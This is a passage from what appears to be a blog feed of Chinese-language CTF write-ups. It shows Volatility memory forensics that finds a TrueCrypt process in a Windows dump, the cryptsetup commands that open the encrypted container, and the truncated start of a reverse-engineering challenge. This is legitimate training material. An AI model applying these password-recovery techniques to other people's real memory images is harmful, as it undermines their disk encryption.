首先他有提到他有用加密的技術隱藏secret，所以我們的目的就是要找到password&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---memory-forensics">
 Exploit - Memory Forensics
 &lt;a class="anchor" href="#exploit---memory-forensics">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>先找到運行的OS version或其他軟硬體資訊
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw imageinfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INFO : volatility.debug : Determining profile based on KDBG search...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer1 : IA32PagedMemoryPae &lt;span style="color:#f92672">(&lt;/span>Kernel AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer2 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>/mnt/d/Download/Trash/dump.raw&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PAE type : PAE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DTB : 0x185000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KDBG : 0x82b3db78L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Number of Processors : &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image Type &lt;span style="color:#f92672">(&lt;/span>Service Pack&lt;span style="color:#f92672">)&lt;/span> : &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KPCR &lt;span style="color:#66d9ef">for&lt;/span> CPU &lt;span style="color:#ae81ff">0&lt;/span> : 0x839a5000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KUSER_SHARED_DATA : 0xffdf0000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image date and time : 2023-02-16 12:03:16 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image local date and time : 2023-02-16 14:03:16 +0200
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>重點: &lt;code>Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86&lt;/code>&lt;/li>
&lt;li>列出當時系統正在運行的process
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw pslist --profile&lt;span style="color:#f92672">=&lt;/span>Win7SP0x86
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Offset&lt;span style="color:#f92672">(&lt;/span>V&lt;span style="color:#f92672">)&lt;/span> Name PID PPID Thds Hnds Sess Wow64 Start Exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8413a938 System &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">88&lt;/span> &lt;span style="color:#ae81ff">520&lt;/span> ------ &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:48 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84e481c8 smss.exe &lt;span style="color:#ae81ff">252&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">29&lt;/span> ------ &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:49 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84cae358 csrss.exe &lt;span style="color:#ae81ff">340&lt;/span> &lt;span style="color:#ae81ff">324&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#ae81ff">550&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:53 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x844ea030 wininit.exe &lt;span style="color:#ae81ff">392&lt;/span> &lt;span style="color:#ae81ff">324&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">77&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84ef5030 csrss.exe &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#ae81ff">384&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> &lt;span style="color:#ae81ff">223&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8573dd20 winlogon.exe &lt;span style="color:#ae81ff">456&lt;/span> &lt;span style="color:#ae81ff">384&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">114&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85749868 services.exe &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">392&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#ae81ff">228&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85763030 lsass.exe &lt;span style="color:#ae81ff">508&lt;/span> &lt;span style="color:#ae81ff">392&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">578&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:55 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85764030 lsm.exe &lt;span style="color:#ae81ff">516&lt;/span> &lt;span style="color:#ae81ff">392&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">149&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:55 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857bd510 svchost.exe &lt;span style="color:#ae81ff">624&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#ae81ff">362&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:56 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85809510 svchost.exe &lt;span style="color:#ae81ff">704&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">298&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:56 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85859920 svchost.exe &lt;span style="color:#ae81ff">784&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> &lt;span style="color:#ae81ff">510&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:56 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8586da80 svchost.exe &lt;span style="color:#ae81ff">832&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">265&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:57 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85872bb0 svchost.exe &lt;span style="color:#ae81ff">856&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span> &lt;span style="color:#ae81ff">731&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:57 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85875460 svchost.exe &lt;span style="color:#ae81ff">880&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">47&lt;/span> &lt;span style="color:#ae81ff">1013&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:57 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8588f370 audiodg.exe &lt;span style="color:#ae81ff">960&lt;/span> &lt;span style="color:#ae81ff">784&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">132&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:57 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x858c2420 svchost.exe &lt;span style="color:#ae81ff">1092&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span> &lt;span style="color:#ae81ff">389&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:58 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857d6030 spoolsv.exe &lt;span style="color:#ae81ff">1288&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">270&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857d1030 dwm.exe &lt;span style="color:#ae81ff">1296&lt;/span> &lt;span style="color:#ae81ff">832&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">114&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857c7030 svchost.exe &lt;span style="color:#ae81ff">1324&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">310&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857a5d20 explorer.exe &lt;span style="color:#ae81ff">1384&lt;/span> &lt;span style="color:#ae81ff">1276&lt;/span> &lt;span style="color:#ae81ff">33&lt;/span> &lt;span style="color:#ae81ff">923&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857c4d20 taskhost.exe &lt;span style="color:#ae81ff">1400&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">197&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85837898 svchost.exe &lt;span style="color:#ae81ff">1560&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#ae81ff">146&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:00 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x841d1030 VGAuthService. &lt;span style="color:#ae81ff">1720&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">85&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:01 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x841d7118 vmtoolsd.exe &lt;span style="color:#ae81ff">1736&lt;/span> &lt;span style="color:#ae81ff">1384&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">181&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:02 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85856030 vm3dservice.ex &lt;span style="color:#ae81ff">1836&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:03 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85857d20 vmtoolsd.exe &lt;span style="color:#ae81ff">1856&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">291&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:03 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x841e5678 vm3dservice.ex &lt;span style="color:#ae81ff">1880&lt;/span> &lt;span style="color:#ae81ff">1836&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">44&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:03 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85a26030 svchost.exe &lt;span style="color:#ae81ff">384&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#ae81ff">93&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85a6e5d0 dllhost.exe &lt;span style="color:#ae81ff">876&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">191&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85941c28 dllhost.exe &lt;span style="color:#ae81ff">1744&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85ab6260 msdtc.exe &lt;span style="color:#ae81ff">1128&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">154&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:06 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85ac8b00 WmiPrvSE.exe &lt;span style="color:#ae81ff">232&lt;/span> &lt;span style="color:#ae81ff">624&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">193&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:06 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x841f4470 SearchIndexer. &lt;span style="color:#ae81ff">2148&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">604&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:08 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85b2a030 VSSVC.exe &lt;span style="color:#ae81ff">2276&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">118&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:11 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85b80cb8 SearchProtocol &lt;span style="color:#ae81ff">2372&lt;/span> &lt;span style="color:#ae81ff">2148&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> &lt;span style="color:#ae81ff">284&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:13 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85b855f8 SearchFilterHo &lt;span style="color:#ae81ff">2392&lt;/span> &lt;span style="color:#ae81ff">2148&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">104&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:13 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85b97d20 svchost.exe &lt;span style="color:#ae81ff">2480&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">232&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:15 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85bc5398 wmpnetwk.exe &lt;span style="color:#ae81ff">2632&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#ae81ff">212&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:16 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85bba030 WmiPrvSE.exe &lt;span style="color:#ae81ff">2860&lt;/span> &lt;span style="color:#ae81ff">624&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">319&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:25 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85c53030 WmiApSrv.exe &lt;span style="color:#ae81ff">3004&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">112&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:30 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85c596c0 TrueCrypt.exe &lt;span style="color:#ae81ff">3196&lt;/span> &lt;span style="color:#ae81ff">1384&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">67&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:02:07 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84d54d20 sppsvc.exe &lt;span style="color:#ae81ff">3736&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">154&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:03:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84d567f0 svchost.exe &lt;span style="color:#ae81ff">3776&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">353&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:03:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x844fcd20 DumpIt.exe &lt;span style="color:#ae81ff">4072&lt;/span> &lt;span style="color:#ae81ff">1384&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:03:14 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x844ba6e0 conhost.exe &lt;span style="color:#ae81ff">4080&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">51&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:03:14 UTC+0000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>重點：&lt;code>0x85c596c0 TrueCrypt.exe 3196 1384 2 67 1 0 2023-02-16 12:02:07 UTC+0000&lt;/code>
&lt;a href="https://zh.wikipedia.org/zh-tw/TrueCrypt">TrueCrypt - Wiki&lt;/a>
&lt;blockquote>
&lt;p>TrueCrypt是一款已停止開發的動態（On-the-fly）磁碟加密軟體，支援Windows、macOS和Linux作業系統。它可在單個檔案和磁碟分割區中建立加密區，也可以加密整個作業系統，解密後使用者即可像普通分割區一樣使用其中的檔案。TrueCrypt支援使用密碼、金鑰檔案作為解密憑據。&lt;/p></description></item><item><title>CrewCTF - Encrypt10n(Part 2)</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-2/</guid><description>&lt;h1 id="crewctf---encrypt10npart-2">
 CrewCTF - Encrypt10n(Part 2)
 &lt;a class="anchor" href="#crewctf---encrypt10npart-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://kenfavors.com/code/how-to-open-a-truecrypt-container-using-cryptsetup/">How To Open A TrueCrypt Container Using cryptsetup&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&lt;code>$ sudo cryptsetup --type tcrypt open container-to-mount container-name&lt;/code>&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://blog.51cto.com/majesty/991565">什麽是塊設備，什麽是字符設備？有什麽區別？&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題應該是沿用part 1得到的密碼進行解密&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>用&lt;code>cryptsetup&lt;/code>&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>先進行解密&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo cryptsetup --type tcrypt open flag flag_decrypt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Enter passphrase &lt;span style="color:#66d9ef">for&lt;/span> flag:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>則輸出的結果就是一個container儲存在&lt;code>/dev/mapper&lt;/code>，可以看到它是一個block device&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ll /dev/mapper
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">2&lt;/span> root root &lt;span style="color:#ae81ff">80&lt;/span> Jul &lt;span style="color:#ae81ff">12&lt;/span> 21:44 .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">11&lt;/span> root root &lt;span style="color:#ae81ff">3140&lt;/span> Jul &lt;span style="color:#ae81ff">12&lt;/span> 21:44 ..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>crw------- &lt;span style="color:#ae81ff">1&lt;/span> root root 10, &lt;span style="color:#ae81ff">236&lt;/span> Jul &lt;span style="color:#ae81ff">11&lt;/span> 23:06 control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>brw-rw---- &lt;span style="color:#ae81ff">1&lt;/span> root disk 252, &lt;span style="color:#ae81ff">3&lt;/span> Jul &lt;span style="color:#ae81ff">12&lt;/span> 21:44 flag_dec
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>再來就要把這個container掛起來，要掛起來才能讀取裡面的資料&lt;/p></description></item><item><title>CrewCTF - ez rev</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/reverse/crewctf---ez-rev/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/reverse/crewctf---ez-rev/</guid><description>&lt;h1 id="crewctf---ez-rev">
 CrewCTF - ez rev
 &lt;a class="anchor" href="#crewctf---ez-rev">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Fake Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> __noreturn &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> a1, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a2, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+Ch] [rbp-4h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Another flag checker...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fgets(byte_4200E0, &lt;span style="color:#ae81ff">256&lt;/span>, stdin);
